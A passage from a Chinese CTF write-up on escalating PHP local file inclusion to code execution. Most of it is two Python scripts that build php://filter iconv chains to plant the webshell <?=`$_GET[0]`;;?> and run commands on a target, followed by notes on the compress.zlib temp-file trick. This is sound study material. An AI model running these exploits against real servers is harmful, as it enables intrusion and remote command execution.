+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=s2>&#34;http://ip:port/index.php&#34;</span>
+</span></span><span class=line><span class=cl><span class=n>file_to_use</span> <span class=o>=</span> <span class=s2>&#34;/etc/passwd&#34;</span>
+</span></span><span class=line><span class=cl><span class=n>command</span> <span class=o>=</span> <span class=s2>&#34;id&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>#&lt;?=`$_GET[0]`;;?&gt;</span>
+</span></span><span class=line><span class=cl><span class=n>base64_payload</span> <span class=o>=</span> <span class=s2>&#34;PD89YCRfR0VUWzBdYDs7Pz4&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>conversions</span> <span class=o>=</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;R&#39;</span><span class=p>:</span> <span class=s1>&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;B&#39;</span><span class=p>:</span> <span class=s1>&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;C&#39;</span><span class=p>:</span> <span class=s1>&#39;convert.iconv.UTF8.CSISO2022KR&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;8&#39;</span><span class=p>:</span> <span class=s1>&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;9&#39;</span><span class=p>:</span> <span class=s1>&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;f&#39;</span><span class=p>:</span> <span class=s1>&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;s&#39;</span><span class=p>:</span> <span class=s1>&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;z&#39;</span><span class=p>:</span> <span class=s1>&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;U&#39;</span><span class=p>:</span> <span class=s1>&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;P&#39;</span><span class=p>:</span> <span class=s1>&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;V&#39;</span><span class=p>:</span> <span class=s1>&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;0&#39;</span><span class=p>:</span> <span class=s1>&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;Y&#39;</span><span class=p>:</span> <span class=s1>&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;W&#39;</span><span class=p>:</span> <span class=s1>&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;d&#39;</span><span class=p>:</span> <span class=s1>&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;D&#39;</span><span class=p>:</span> <span class=s1>&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;7&#39;</span><span class=p>:</span> <span class=s1>&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;4&#39;</span><span class=p>:</span> <span class=s1>&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2&#39;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># generate some garbage base64</span>
+</span></span><span class=line><span class=cl><span class=n>filters</span> <span class=o>=</span> <span class=s2>&#34;convert.iconv.UTF8.CSISO2022KR|&#34;</span>
+</span></span><span class=line><span class=cl><span class=n>filters</span> <span class=o>+=</span> <span class=s2>&#34;convert.base64-encode|&#34;</span>
+</span></span><span class=line><span class=cl><span class=c1># make sure to get rid of any equal signs in both the string we just generated and the rest of the file</span>
+</span></span><span class=line><span class=cl><span class=n>filters</span> <span class=o>+=</span> <span class=s2>&#34;convert.iconv.UTF8.UTF7|&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>c</span> <span class=ow>in</span> <span class=n>base64_payload</span><span class=p>[::</span><span class=o>-</span><span class=mi>1</span><span class=p>]:</span>
+</span></span><span class=line><span class=cl>        <span class=n>filters</span> <span class=o>+=</span> <span class=n>conversions</span><span class=p>[</span><span class=n>c</span><span class=p>]</span> <span class=o>+</span> <span class=s2>&#34;|&#34;</span>
+</span></span><span class=line><span class=cl>        <span class=c1># decode and reencode to get rid of everything that isn&#39;t valid base64</span>
+</span></span><span class=line><span class=cl>        <span class=n>filters</span> <span class=o>+=</span> <span class=s2>&#34;convert.base64-decode|&#34;</span>
+</span></span><span class=line><span class=cl>        <span class=n>filters</span> <span class=o>+=</span> <span class=s2>&#34;convert.base64-encode|&#34;</span>
+</span></span><span class=line><span class=cl>        <span class=c1># get rid of equal signs</span>
+</span></span><span class=line><span class=cl>        <span class=n>filters</span> <span class=o>+=</span> <span class=s2>&#34;convert.iconv.UTF8.UTF7|&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>filters</span> <span class=o>+=</span> <span class=s2>&#34;convert.base64-decode&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>final_payload</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;php://filter/</span><span class=si>{</span><span class=n>filters</span><span class=si>}</span><span class=s2>/resource=</span><span class=si>{</span><span class=n>file_to_use</span><span class=si>}</span><span class=s2>&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>params</span><span class=o>=</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;0&#34;</span><span class=p>:</span> <span class=n>command</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;cfile&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;value&#34;</span><span class=p>:</span> <span class=n>final_payload</span>
+</span></span><span class=line><span class=cl><span class=p>})</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div><p><img src=https://cdn.jsdelivr.net/gh/zk1te/img/image-20220111001134640.png loading=lazy alt=image-20220111001134640></p><h3 id=限制-1>限制</h3><p>这个trick的限制无论是上午Smity师傅的文章还是Zeddy师傅的文章下面的评论都有提到过，就是某些字符集在某些系统并不支持，比如Ubuntu18.04，十分幸运，php官方带apache的镜像是Debain，运行上面的脚本没有任何问题，这里猜测hxp2021的出题人用的也是同一个镜像（xs）</p><p>解决的办法其实并不难，只需要将新的字符集放到wupco师傅的脚本中再跑一次就可以了，这里直接使用Smity师傅<a class=link href=https://articles.zsxq.com/id_7fehbswop47u.html target=_blank rel=noopener>下午新发的exp</a>：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>#参数file</span>
+</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=s2>&#34;http://192.168.190.191/index.php&#34;</span>
+</span></span><span class=line><span class=cl><span class=n>file_to_use</span> <span class=o>=</span> <span class=s2>&#34;index&#34;</span>
+</span></span><span class=line><span class=cl><span class=n>command</span> <span class=o>=</span> <span class=s2>&#34;whoami&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>#&lt;?=`$_GET[0]`;;?&gt;</span>
+</span></span><span class=line><span class=cl><span class=n>base64_payload</span> <span class=o>=</span> <span class=s2>&#34;PD89YCRfR0VUWzBdYDs7Pz4&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>conversions</span> <span class=o>=</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;R&#39;</span><span class=p>:</span> <span class=s1>&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;B&#39;</span><span class=p>:</span> <span class=s1>&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;C&#39;</span><span class=p>:</span> <span class=s1>&#39;convert.iconv.UTF8.CSISO2022KR&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;8&#39;</span><span class=p>:</span> <span class=s1>&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;9&#39;</span><span class=p>:</span> <span class=s1>&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;f&#39;</span><span class=p>:</span> <span class=s1>&#39;convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;s&#39;</span><span class=p>:</span> <span class=s1>&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;z&#39;</span><span class=p>:</span> <span class=s1>&#39;convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;U&#39;</span><span class=p>:</span> <span class=s1>&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;P&#39;</span><span class=p>:</span> <span class=s1>&#39;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;V&#39;</span><span class=p>:</span> <span class=s1>&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;0&#39;</span><span class=p>:</span> <span class=s1>&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;Y&#39;</span><span class=p>:</span> <span class=s1>&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;W&#39;</span><span class=p>:</span> <span class=s1>&#39;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;d&#39;</span><span class=p>:</span> <span class=s1>&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;D&#39;</span><span class=p>:</span> <span class=s1>&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;7&#39;</span><span class=p>:</span> <span class=s1>&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;4&#39;</span><span class=p>:</span> <span class=s1>&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2&#39;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># generate some garbage base64</span>
+</span></span><span class=line><span class=cl><span class=n>filters</span> <span class=o>=</span> <span class=s2>&#34;convert.iconv.UTF8.CSISO2022KR|&#34;</span>
+</span></span><span class=line><span class=cl><span class=n>filters</span> <span class=o>+=</span> <span class=s2>&#34;convert.base64-encode|&#34;</span>
+</span></span><span class=line><span class=cl><span class=c1># make sure to get rid of any equal signs in both the string we just generated and the rest of the file</span>
+</span></span><span class=line><span class=cl><span class=n>filters</span> <span class=o>+=</span> <span class=s2>&#34;convert.iconv.UTF8.UTF7|&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>c</span> <span class=ow>in</span> <span class=n>base64_payload</span><span class=p>[::</span><span class=o>-</span><span class=mi>1</span><span class=p>]:</span>
+</span></span><span class=line><span class=cl>        <span class=n>filters</span> <span class=o>+=</span> <span class=n>conversions</span><span class=p>[</span><span class=n>c</span><span class=p>]</span> <span class=o>+</span> <span class=s2>&#34;|&#34;</span>
+</span></span><span class=line><span class=cl>        <span class=c1># decode and reencode to get rid of everything that isn&#39;t valid base64</span>
+</span></span><span class=line><span class=cl>        <span class=n>filters</span> <span class=o>+=</span> <span class=s2>&#34;convert.base64-decode|&#34;</span>
+</span></span><span class=line><span class=cl>        <span class=n>filters</span> <span class=o>+=</span> <span class=s2>&#34;convert.base64-encode|&#34;</span>
+</span></span><span class=line><span class=cl>        <span class=c1># get rid of equal signs</span>
+</span></span><span class=line><span class=cl>        <span class=n>filters</span> <span class=o>+=</span> <span class=s2>&#34;convert.iconv.UTF8.UTF7|&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>filters</span> <span class=o>+=</span> <span class=s2>&#34;convert.base64-decode&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>final_payload</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;php://filter/</span><span class=si>{</span><span class=n>filters</span><span class=si>}</span><span class=s2>/resource=</span><span class=si>{</span><span class=n>file_to_use</span><span class=si>}</span><span class=s2>&#34;</span>
+</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>final_payload</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>params</span><span class=o>=</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;0&#34;</span><span class=p>:</span> <span class=n>command</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=c1>#&#34;action&#34;: &#34;include&#34;,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;file&#34;</span><span class=p>:</span> <span class=n>final_payload</span>
+</span></span><span class=line><span class=cl><span class=p>})</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div><h2 id=使用compresszlib生成临时文件>使用<code>compress.zlib://</code>生成临时文件</h2><p>这个是2019年hxp36c3ctf里面<code>includer</code>的预期解（hxp也太爱LFI了吧），对其他师傅们来说好像不是新姿势了，不过我是通过<code>includer's revenge</code>以及师傅们的文章才知道有这个方法（有递归复习内味了）</p><p>这里还是学习Zeddy师傅的<a class=link href=https://blog.zeddyu.info/2020/01/08/36c3-web/#includer target=_blank rel=noopener>文章</a>，除此之外还有balsn队伍的<a class=link href=https://balsn.tw/ctf_writeup/20191228-hxp36c3ctf/#includer target=_blank rel=noopener>writeup</a>，大概的意思就是通过对<a class=link href=https://github.com/php/php-src target=_blank rel=noopener>php-src</a>源代码的分析，发现可以使用<code>compress.zip://</code>流上传任意文件（<code>compress.zip://http</code>或者<code>compress.zip://ftp</code>，前提是开启<code>allow_url_include</code>），在此过程中会生成临时文件，然后再经过一系列操作之后绕过WAF并且保存临时文件，最终实现RCE</p><p>最后看下来好像这个方法并没有特别的惊艳，特别是需要开启<code>allow_url_include</code>，而这个配置php默认是关闭的。</p><p>因为这个方法需要搭配特定的配置（nginx配置漏洞导致目录遍历）以及WAF（过滤<code>&lt;?</code>），所以就没有折腾我们可怜的willphp进行复现了。</p><h2 id=最后>最后</h2><p>全篇文章没写什么深入的东西，因为确实没办法写的比上面那些师傅更好，只是单纯做个记录方便自己查阅吧，感兴趣的师傅可以点开其他师傅的文章深入学习。</p><h2 id=参考>参考</h2><p><a class=link href=https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html target=_blank rel=noopener>Docker PHP裸文件本地包含综述 | 离别歌 (leavesongs.com)</a></p><p><a class=link href=https://blog.csdn.net/rfrder/article/details/121042290 target=_blank rel=noopener>利用pearcmd.php从LFI到getshell_feng的博客-CSDN博客</a></p><p><a class=link href=https://tttang.com/archive/1384/ target=_blank rel=noopener>hxp CTF 2021 - A New Novel LFI - 跳跳糖 (tttang.com)</a></p><p><a class=link href=https://bierbaumer.net/security/php-lfi-with-nginx-assistance/ target=_blank rel=noopener>0xbb - PHP LFI with Nginx Assistance (bierbaumer.net)</a></p><p><a class=link href=https://tttang.com/archive/1395/ target=_blank rel=noopener>hxp CTF 2021 - The End Of LFI? - 跳跳糖 (tttang.com)</a></p><p><a class=link href=https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d target=_blank rel=noopener>Solving &ldquo;includer&rsquo;s revenge&rdquo; from hxp ctf 2021 without controlling any files (github.com)</a></p><p><a class=link href=https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT target=_blank rel=noopener>GitHub - wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT</a></p><p><a class=link href=https://blog.zeddyu.info/2020/01/08/36c3-web/#includer target=_blank rel=noopener>36c3 Web 学习记录 (zeddyu.info)</a></p></section><footer class=article-footer><section class=article-tags><a href=/tags/ctf/>Ctf</a>
+<a href=/tags/web/>Web</a></section><section class=article-copyright><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
+<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><aside class=related-content--wrapper><h2 class=section-title>相关文章</h2><div class=related-content><div class="flex article-list--tile"><article><a href=/p/ctf%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5%E5%B0%8F%E7%BB%93/><div class=article-details><h2 class=article-title>ctf无列名注入小结</h2></div></a></article><article><a href=/p/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/><div class=article-details><h2 class=article-title>Java反序列化基础</h2></div></a></article></div></div></aside><div class=disqus-container><div id=disqus_thread></div><script>window.disqus_config=function(){},function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById("disqus_thread").innerHTML="Disqus comments not available by default when the website is previewed locally.";return}var t=document,e=t.createElement("script");e.async=!0,e.src="//k1te.disqus.com/embed.js",e.setAttribute("data-timestamp",+new Date),(t.head||t.body).appendChild(e)}()</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a></div><style>.disqus-container{background-color:var(--card-background);border-radius:var(--card-border-radius);box-shadow:var(--shadow-l1);padding:var(--card-padding)}</style><script>window.addEventListener("onColorSchemeChange",e=>{typeof DISQUS=="object"&&DISQUS.reset({reload:!0})})</script><footer class=site-footer><section class=copyright>&copy;
+2020 -
+2024 k1te's blog</section><section class=powerby>使用 <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> 构建<br>主题 <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.26.0>Stack</a></b> 由 <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a> 设计</section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+<button class="pswp__button pswp__button--share" title=Share></button>
+<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+</button>
+<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>
